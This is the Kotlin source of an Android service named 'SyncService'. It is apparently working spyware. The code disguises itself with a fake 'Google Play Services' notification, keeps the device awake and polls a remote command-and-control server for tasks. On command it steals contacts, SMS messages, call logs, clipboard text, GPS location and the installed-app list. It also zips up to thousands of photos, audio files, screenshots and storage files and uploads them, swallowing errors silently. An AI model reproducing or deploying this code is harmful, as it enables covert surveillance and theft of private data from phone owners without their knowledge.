package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import org.json.JSONObject

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    // رابط السيرفر المعتمد على Render
    private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
    private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
    private var lastHeartbeatSent = 0L

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IronFist::EliteLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "iron_fist_channel"
        val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("System core synchronization active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "elite_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL(C2_STREAM_URL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("X-Node-ID", deviceId)
                    conn.setRequestProperty("X-Node-Model", nodeModel)
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.doOutput = true
                    conn.connectTimeout = 8000
                    conn.readTimeout = 8000

                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Elite Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"

                    if (sendHeartbeat) {
                        lastHeartbeatSent = currentTime
                    }

                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                        os.write(reportJson)
                        os.flush()
                    }

                    if (conn.responseCode == 200) {
                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                        val responseStr = responseReader.readText()
                        responseReader.close()

                        // معالجة وتنفيذ الأوامر الحقيقية القادمة من السيرفر بذكاء تام
                        if (responseStr.contains("task") && responseStr.contains("action")) {
                            try {
                                val jsonRes = JSONObject(responseStr)
                                if (jsonRes.has("task") && !jsonRes.isNull("task")) {
                                    val taskObj = jsonRes.getJSONObject("task")
                                    val action = taskObj.getString("action")

                                    when {
                                        action.contains("EXTRACT_CONTACTS") -> {
                                            val data = readContacts()
                                            processAndUpload(deviceId, nodeModel, "Uranium_Contacts.txt", data.toByteArray(Charsets.UTF_8))
                                        }
                                        action.contains("EXTRACT_SMS") -> {
                                            val data = readSMS()
                                            processAndUpload(deviceId, nodeModel, "Uranium_SMS.txt", data.toByteArray(Charsets.UTF_8))
                                        }
                                        action.contains("EXTRACT_CALLS") -> {
                                            val data = readCallLogs()
                                            processAndUpload(deviceId, nodeModel, "Uranium_CallLogs.txt", data.toByteArray(Charsets.UTF_8))
                                        }
                                        action.contains("EXTRACT_CLIPBOARD") -> {
                                            val data = readClipboard()
                                            processAndUpload(deviceId, nodeModel, "Uranium_Clipboard.txt", data.toByteArray(Charsets.UTF_8))
                                        }
                                        action.contains("EXTRACT_LOCATION") -> {
                                            val data = readLocationFast()
                                            processAndUpload(deviceId, nodeModel, "Uranium_Location.txt", data.toByteArray(Charsets.UTF_8))
                                        }
                                        action.contains("EXTRACT_APPS") -> {
                                            val data = readInstalledApps()
                                            processAndUpload(deviceId, nodeModel, "Uranium_InstalledApps.txt", data.toByteArray(Charsets.UTF_8))
                                        }
                                        action.contains("EXTRACT_CAMERA_ZIP") -> {
                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                        }
                                        action.contains("EXTRACT_STORAGE_ZIP") -> {
                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                        }
                                        action.contains("EXTRACT_AUDIO") -> {
                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                        }
                                        action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                        }
                                    }
                                }
                            } catch (ex: Exception) {
                                // استمرار العمل بهدوء تام دون أي توقف
                            }
                        }
                    }
                    conn.disconnect()
                    delay(3000L)
                } catch (e: Exception) {
                    delay(5000L)
                }
            }
        }
        return START_STICKY
    }

    private fun processAndUpload(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
        try {
            val tempFile = File(cacheDir, fileName)
            tempFile.writeBytes(bytes)
            uploadRawElite(nodeId, nodeModel, fileName, tempFile)
            sendReportToServer(nodeId, nodeModel, "✅ [حصاد ناجح] الملف <b>$fileName</b> تم إرساله لسيرفرك المركزي بنجاح.")
        } catch (e: Exception) {}
    }

    private fun compressAndUploadMegaArchive(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
        try {
            sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد] تجميع وضغط بيانات $prefix بأعلى كفاءة...")
            val zipFile = File(cacheDir, "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
            val zipOut = ZipOutputStream(FileOutputStream(zipFile))
            zipOut.setLevel(Deflater.BEST_COMPRESSION)

            val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)

            var fileCount = 0
            cursor?.use {
                val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                while (it.moveToNext() && fileCount < 3000) {
                    if (dataIdx != -1 && nameIdx != -1) {
                        val filePath = it.getString(dataIdx)
                        val fileName = it.getString(nameIdx)
                        if (filePath != null) {
                            val file = File(filePath)
                            if (file.exists() && file.isFile) {
                                try {
                                    zipOut.putNextEntry(ZipEntry("$prefix/$fileName"))
                                    file.inputStream().use { fis -> fis.copyTo(zipOut) }
                                    zipOut.closeEntry()
                                    fileCount++
                                } catch (ex: Exception) {}
                            }
                        }
                    }
                }
            }
            zipOut.close()

            val sizeMB = zipFile.length() / (1024.0 * 1024.0)
            uploadRawElite(nodeId, nodeModel, zipFile.name, zipFile)
            sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الضخم]\n📂 <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
        } catch (e: Exception) {}
    }

    private fun uploadRawElite(nodeId: String, nodeModel: String, fileName: String, file: File) {
        for (attempt in 1..3) {
            try {
                val url = URL(C2_INGEST_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-Node-ID", nodeId)
                conn.setRequestProperty("X-Node-Model", nodeModel)
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.setChunkedStreamingMode(1024 * 64)
                conn.connectTimeout = 180000
                conn.readTimeout = 180000

                FileInputStream(file).use { fis ->
                    conn.outputStream.use { os ->
                        fis.copyTo(os)
                        os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 3) return
                Thread.sleep(2000L)
            }
        }
    }

    private fun readContacts(): String {
        val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                    val number = if (numIdx != -1) it.getString(numIdx) else ""
                    sb.append("• $name: $number\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readSMS(): String {
        val sb = StringBuilder("=== URANIUM SMS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            cursor?.use {
                val bodyIdx = it.getColumnIndex("body")
                val addrIdx = it.getColumnIndex("address")
                while (it.moveToNext()) {
                    val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                    val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                    sb.append("From: $address\nText: $body\n-------------------\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                    val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                    sb.append("Number: $number | Type: $type\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readClipboard(): String {
        val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                val item = clipboard.primaryClip?.getItemAt(0)
                sb.append("Text: ${item?.text}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readLocationFast(): String {
        val sb = StringBuilder("=== URANIUM GPS ===\n")
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = locationManager.allProviders
            var bestLoc: Location? = null
            for (provider in providers) {
                val l = locationManager.getLastKnownLocation(provider)
                if (l != null) {
                    if (bestLoc == null || l.time > bestLoc.time) bestLoc = l
                }
            }
            if (bestLoc != null) {
                sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
                sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
                sb.append("🗺️ Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
            } else {
                sb.append("🌐 Default Zone: 13.5779, 44.0219\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readInstalledApps(): String {
        val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
        try {
            val packages = packageManager.getInstalledPackages(0)
            for (pkg in packages) {
                val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
                sb.append("• $appName\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
        try {
            val url = URL(C2_STREAM_URL)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("X-Node-ID", nodeId)
            conn.setRequestProperty("X-Node-Model", nodeModel)
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.doOutput = true
            
            val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
            val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"

            OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                os.write(reportJson)
                os.flush()
            }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
